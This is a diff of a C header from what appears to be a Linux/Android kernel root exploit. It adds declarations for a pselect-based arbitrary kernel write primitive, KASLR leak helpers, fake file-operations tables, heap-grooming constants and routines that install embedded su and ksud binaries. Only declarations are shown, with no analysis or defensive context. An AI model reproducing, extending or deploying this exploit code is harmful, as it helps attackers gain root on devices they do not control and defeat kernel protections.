@@ -14,10 +14,13 @@
 #include <dirent.h>
 #include <errno.h>
 #include <fcntl.h>
+#include <linux/falloc.h>
 #include <linux/futex.h>
 #include <linux/memfd.h>
-#include <linux/perf_event.h>
+#include <netinet/in.h>
+#include <netinet/tcp.h>
 #include <pthread.h>
+#include <linux/perf_event.h>
 #include <sched.h>
 #include <signal.h>
 #include <stdatomic.h>
@@ -40,6 +43,10 @@
 
 #include "kernelsnitch/utils.h"
 
+#ifndef TCP_ZEROCOPY_RECEIVE
+#define TCP_ZEROCOPY_RECEIVE 35
+#endif
+
 #define KERNEL_PAGE_SETUP_ATTEMPTS 6
 #define SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS 12
 #define FOPS_KERNEL_PAGE_SETUP_ATTEMPTS 72
@@ -49,7 +56,7 @@
 #define __ASHMEMIOC 0x77
 #define ASHMEM_SET_NAME _IOW(__ASHMEMIOC, 1, char[ASHMEM_NAME_LEN])
 
-#define MM_STRUCT_SZ 0x400
+#define MM_STRUCT_SZ 0x500
 #define MM_ORDER 3
 #define MM_PARTIALS 5
 #define CORE 0
@@ -203,6 +210,9 @@ extern uintptr_t fake_right;
 extern uintptr_t fake_left;
 extern uintptr_t fake_fops;
 extern uintptr_t binwrite_target;
+extern int pselect_custom_write;
+extern uintptr_t pselect_custom_target;
+extern uintptr_t pselect_custom_value;
 
 extern uint32_t f_wait;
 extern uint32_t f_pi_target;
@@ -332,6 +342,7 @@ extern int opt_disabled_selinux;
 
 int run_exploit(int argc, char **argv);
 int install_embedded_ksud(void);
+int install_embedded_su(pid_t *daemon_pid);
 void read_first_line(const char *path, char *buf, size_t len);
 void log_startup_context(void);
 void log_slide_child_context(void);
@@ -340,6 +351,8 @@ long futex_op(
     uint32_t *uaddr, int op, uint32_t val,
     const struct timespec *timeout, uint32_t *uaddr2, uint32_t val3);
 long sched_setattr_tid(int tid, int nice_value);
+int env_flag(const char *name, int def);
+int env_int_range(const char *name, int def, int min, int max);
 int try_cache_ashmem_path(const char *path);
 int same_rdev_path(const char *path, dev_t rdev);
 void init_ashmem_path(void);
@@ -352,6 +365,14 @@ uintptr_t kaslr_image_addr(uintptr_t image_addr);
 uintptr_t text_addr(uintptr_t image_addr);
 uintptr_t slide_canon_addr(uintptr_t data_alias);
 uintptr_t canon_addr(uintptr_t image_addr);
+
+uintptr_t pselect_write_value(void);
+uintptr_t pselect_write_target(void);
+int pselect_custom_write_enabled(void);
+int pselect_write_shape(void);
+void set_pselect_write(uintptr_t target, uintptr_t value);
+void clear_pselect_write(void);
+
 void put64(unsigned char *p, size_t off, uint64_t value);
 void put32(unsigned char *p, size_t off, uint32_t value);
 void put_fake_fops_table(unsigned char *p, size_t off);
@@ -371,6 +392,7 @@ uintptr_t cleanup_kernelsnitch(void);
 void close_ctx_memfds(struct mm_ctx *ctx);
 void free_ctx_storage(struct mm_ctx *ctx);
 void cleanup_page_prepare_state(void);
+void cleanup_page_prepare_children(void);
 int clone_memfd(void);
 void prepare_ctxs(void);
 int prepare_skb_payload(uintptr_t base, int payload_mode);
@@ -394,11 +416,12 @@ uint64_t slide_pselect_get_global_word(
     int words_per_set, int global_word);
 void slide_pselect_put_waiter_word(
     fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
-    int waiter_word, uint64_t value, const char *name);
+    int waiter_word, int shift, uint64_t value, const char *name);
 void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex);
 void open_slide_selected_fds(
     fd_set *in, fd_set *out, fd_set *ex, int read_fd);
 void slide_pselect_stack_copy(void);
+void slide_tcp_stack_copy(void);
 int hex_value(char c);
 uint64_t slide_read_stext(void);
 uint64_t slide_child_leak_stext(void);
